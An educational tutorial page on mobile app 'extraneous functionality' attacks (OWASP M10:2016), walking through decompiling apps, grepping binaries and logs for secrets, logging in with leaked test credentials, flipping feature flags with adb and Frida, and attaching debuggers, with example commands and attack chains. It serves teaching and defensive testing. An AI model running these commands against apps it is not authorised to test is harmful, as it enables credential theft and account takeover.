# M10:2016 Extraneous Functionality - Attack Vectors

## Table of Contents
- [Understanding the Attack Model](#understanding-the-attack-model)
- [Core Attack Flow](#core-attack-flow)
- [Discovery and Exploitation Patterns](#discovery-and-exploitation-patterns)
- [Chaining Extraneous Functionality](#chaining-extraneous-functionality)

## Understanding the Attack Model

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and remove this functionality from apps you own or are authorised to test.

Extraneous functionality is not exploited with a crafted payload—it is exploited with a **decompiler and patience**. The attacker starts from a position of total advantage: they hold the entire application binary and run it on a device they fully control. Their whole job is to *inspect* the app, notice functionality that was never meant for them, and then *invoke* it.

The workflow is almost always the same three moves: obtain the binary, read what's inside it (strings, code, config, logs), and exercise whatever hidden capability that reading reveals—a staging endpoint, a test account, a debug menu, a backdoor check.

### The Attacker's Toolkit

| Goal | Android | iOS |
|------|---------|-----|
| Unpack the app | `apktool d app.apk` | Unzip the `.ipa`, inspect the `.app` bundle |
| Decompile to source | `jadx`, `jadx-gui` | `Hopper`, `Ghidra`, `class-dump` |
| Pull raw strings | `strings classes.dex` | `strings` on the Mach-O binary |
| Read logs | `adb logcat` | Console.app / device logs |
| Hook / patch at runtime | `Frida`, `Xposed` | `Frida`, `Cycript` (jailbroken) |
| Attach a debugger | `jdb` if `debuggable=true` | `lldb` on a debuggable/jailbroken build |

### Core Attack Flow

```
1. Acquire
   ↓
   Download the APK/IPA from the store or extract it from a device
2. Inspect
   ↓
   Decompile, grep strings, read the manifest/Info.plist, watch the logs
3. Discover
   ↓
   Find hidden endpoints, test creds, magic values, debug menus, flags
4. Exercise
   ↓
   Call the staging API, log in as the test user, flip the flag, attach a debugger
5. Escalate / Exfiltrate
   ↓
   Unlock features, read leaked data, pivot into the back-end
```

## Discovery and Exploitation Patterns

### 1. Harvesting Secrets and Endpoints From Strings

The cheapest attack is a string dump. Base URLs, API keys, and credentials that were compiled in appear directly in the output.

```
$ strings classes.dex | grep -Ei 'http|api|key|secret|password|staging'
https://staging-api.internal.example.com/
https://api.example.com/
qa_admin
Test1234!
sk_test_51H8x...
```

**Payoff**: internal hostnames, a working test account, and API keys—no reverse engineering of logic required, just `grep`.

### 2. Reading the Decompiled Source for Hidden Logic

Decompiling to readable Java/pseudo-Swift exposes conditional shortcuts. Attackers grep for tell-tale identifiers: `debug`, `test`, `admin`, `godmode`, `backdoor`, `skip`, `bypass`, `internal`.

```java
// Recovered from jadx — a developer backdoor
public boolean isAuthorized(User u) {
    if (u.getId() == 0xDEADBEEF) return true;   // magic id skips all checks
    return this.acl.check(u);
}
```

**Exploitation**: register or forge the magic identifier and the real access-control check is never consulted.

### 3. Logging in to Test / Staging Endpoints

Once the staging URL and test credentials are recovered, the attacker simply authenticates to the non-production environment.

```
$ curl -s https://staging-api.internal.example.com/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"qa_admin","password":"Test1234!"}'
{ "token": "eyJ...", "role": "admin", "env": "staging" }
```

**Payoff**: access to an environment that is usually less monitored, may contain real data, and can share trust or secrets with production.

### 4. Enabling a Debug Menu / Flipping a Feature Flag

When a feature is hidden only by a client-side boolean, the attacker changes the value at rest or at runtime.

```
# Edit the on-device shared prefs (rooted device or debuggable app)
$ adb shell "run-as com.example.app cat shared_prefs/flags.xml"
<boolean name="ff_new_payments" value="false" />
# Flip it, or hook the getter with Frida:
Java.perform(function () {
  var P = Java.use('android.content.SharedPreferences$Editor');
  // force every getBoolean("ff_...") to return true
});
```

**Payoff**: unreleased or premium functionality that is fully compiled into the app becomes reachable.

### 5. Triggering a Hidden Admin / God-Mode Gesture

Decompiled UI code reveals the secret trigger—a tap sequence, a long-press on a version label, a special input value.

```swift
// Recovered: a hidden entry point behind a magic string
if searchField.text == "!!debug!!" {
    present(InternalDebugMenu())   // exposes toggles, accounts, raw API console
}
```

**Exploitation**: type the magic value and the internal menu opens on a stock, unmodified device—no rooting needed.

### 6. Reading Sensitive Data From Verbose Logs

If release logging is left on, the attacker just watches the log while using the app.

```
$ adb logcat | grep -Ei 'token|auth|user|card'
D/Auth    : login ok user=victim@example.com token=eyJhbGciOi...
D/Network : POST /pay body={"card":"4111111111111111","cvv":"123"}
```

**Payoff**: live session tokens, PII, and payment data captured passively from the device log.

### 7. Attaching a Debugger to a Debuggable Release

If the shipped manifest has `android:debuggable="true"`, any device can attach a debugger to the running process.

```
$ adb jdwp                       # process is debuggable and listed
$ jdb -attach localhost:8700     # inspect memory, call methods, read secrets
```

**Payoff**: full runtime inspection and control—dump decrypted secrets from memory, invoke internal methods, bypass client-side checks—without any software vulnerability.

### 8. Invoking Exported Debug Components Directly

A debug activity or service left `exported` (or reachable via a deep link) can be launched by any app or from the shell.

```
$ adb shell am start -n com.example.app/.DiagnosticsActivity
$ adb shell am start -a android.intent.action.VIEW -d "exampleapp://debug/console"
```

**Payoff**: the developer-only screen runs even though no button in the normal UI points to it.

## Chaining Extraneous Functionality

Individually small leftovers combine into a full compromise:

```
strings dump reveals staging URL + test creds   -> log in to staging
        +
staging is less hardened, shares a token format -> token accepted by internal API
        +
verbose logs leak a real user's session token   -> impersonate a production user
        =  account takeover with no software vulnerability, only leftover code
```

Another common chain:

```
debuggable=true lets a debugger attach          -> read the in-memory config
        -> discover a hidden admin gesture and its magic value
        -> open the internal debug console on a normal device
        -> use its raw API console to call privileged endpoints
```

## Key Takeaways

1. **Inspection is the exploit**—the app is decompiled, grepped, and read; there is no clever payload to defend against, only leftover code to remove.
2. **Strings betray you first**—URLs, keys, and credentials fall out of a `strings` dump before any real analysis begins.
3. **Client-side gates are not gates**—feature flags, hidden menus, and magic values are all reachable once discovered.
4. **Debuggable builds hand over the process**—`debuggable=true` is total runtime access with no exploit.
5. **Small leftovers chain**—a staging URL plus a test account plus a verbose log equals a breach.

## Next Steps

- **[Prevention](prevention.md)**: Keep this functionality out of production builds entirely
- **[Examples](examples.md)**: Vulnerable vs. secure code across Android, iOS, and build config
- **[Overview](overview.md)**: Revisit what counts as extraneous functionality
- **[Mobile Top 10](/learn/mobile)**: Return to the full mobile learning path
- **[Practice](/practice)**: Apply what you've learned in hands-on challenges
